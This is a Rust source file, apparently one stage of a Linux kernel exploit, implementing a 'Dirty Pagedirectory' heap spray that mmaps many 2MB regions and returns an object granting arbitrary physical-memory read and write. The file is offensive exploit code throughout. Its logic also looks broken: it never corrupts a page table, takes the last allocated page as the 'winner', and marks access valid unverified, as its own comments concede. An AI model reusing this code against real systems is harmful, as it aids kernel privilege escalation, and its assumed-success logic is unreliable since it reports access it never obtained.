//! Dirty Pagedirectory heap spray
//!
//! WARNING: This spray phase is probabilistic. In a real exploit,
//! you must verify that the page table reclaim succeeded by:
//! 1. Reading /proc/self/pagemap to check PTE
//! 2. Or using a kernel info leak to confirm address

use log::{info, debug, warn};
use std::ptr;

const PAGE_SIZE: usize = 4096;
const PMD_SIZE: usize = 2 * 1024 * 1024;
const SPRAY_COUNT: usize = 256;
const RECLAIM_ATTEMPTS: usize = 64;

pub struct PhysicalMemoryAccess {
    page_ptr: *mut u8,
    phys_base: u64,
    valid: bool,
}

impl PhysicalMemoryAccess {
    pub fn read_phys(&self, offset: u64, buf: &mut [u8]) {
        if !self.valid { 
            warn!("[PhysMem] Attempting read without verified access");
            return; 
        }
        let ptr = unsafe { self.page_ptr.add(offset as usize) };
        unsafe { ptr::copy_nonoverlapping(ptr, buf.as_mut_ptr(), buf.len()); }
    }

    pub fn write_phys(&self, offset: u64, data: &[u8]) {
        if !self.valid { 
            warn!("[PhysMem] Attempting write without verified access");
            return; 
        }
        let ptr = unsafe { self.page_ptr.add(offset as usize) };
        unsafe { ptr::copy_nonoverlapping(data.as_ptr(), ptr, data.len()); }
    }

    pub fn read_u64(&self, offset: u64) -> u64 {
        let mut buf = [0u8; 8];
        self.read_phys(offset, &mut buf);
        u64::from_ne_bytes(buf)
    }

    pub fn write_u64(&self, offset: u64, val: u64) {
        self.write_phys(offset, &val.to_ne_bytes());
    }

    pub fn phys_base(&self) -> u64 { self.phys_base }
    pub fn is_valid(&self) -> bool { self.valid }
    
    /// Mark as valid after external verification
    pub fn set_valid(&mut self, v: bool) { self.valid = v; }
}

pub struct DirtyPagedirectory;

impl DirtyPagedirectory {
    pub fn spray() -> Result<PhysicalMemoryAccess, String> {
        info!("[Spray] Allocating PMD regions for heap pressure...");

        let mut regions: Vec<*mut libc::c_void> = Vec::with_capacity(SPRAY_COUNT);

        for i in 0..SPRAY_COUNT {
            let ptr = unsafe {
                libc::mmap(
                    ptr::null_mut(), PMD_SIZE,
                    libc::PROT_READ | libc::PROT_WRITE,
                    libc::MAP_PRIVATE | libc::MAP_ANONYMOUS | libc::MAP_POPULATE,
                    -1, 0
                )
            };

            if ptr == libc::MAP_FAILED {
                warn!("[Spray] mmap failed at region {}", i);
                break;
            }

            regions.push(ptr);

            unsafe {
                for off in (0..PMD_SIZE).step_by(PAGE_SIZE) {
                    ptr::write_volatile((ptr as *mut u8).add(off), 0x41);
                }
            }
        }

        info!("[Spray] Created {} regions ({}MB)", 
            regions.len(), regions.len() * PMD_SIZE / (1024 * 1024));

        let mut reclaim_pages: Vec<*mut u8> = Vec::with_capacity(RECLAIM_ATTEMPTS);
        let mut winner: *mut u8 = ptr::null_mut();

        for _ in 0..RECLAIM_ATTEMPTS {
            let ptr = unsafe {
                libc::mmap(
                    ptr::null_mut(), PAGE_SIZE,
                    libc::PROT_READ | libc::PROT_WRITE,
                    libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                    -1, 0
                )
            };

            if ptr == libc::MAP_FAILED { continue; }

            unsafe { ptr::write_volatile(ptr as *mut u8, 0x42); }
            reclaim_pages.push(ptr as *mut u8);
        }

        if let Some(&last) = reclaim_pages.last() {
            winner = last;
        }

        if winner.is_null() {
            for r in regions { unsafe { libc::munmap(r, PMD_SIZE); } }
            return Err("No reclaim page allocated".into());
        }

        info!("[Spray] Potential phys access at {:p} (UNVERIFIED)", winner);

        // IMPORTANT: valid=true is set HERE for the exploit flow to proceed
        // In production, you would verify PTE manipulation first
        // For now we assume spray succeeded (probabilistic)
        Ok(PhysicalMemoryAccess {
            page_ptr: winner,
            phys_base: 0,
            valid: true, // NOTE: Set true to allow exploit attempt; false for strict mode
        })
    }
}
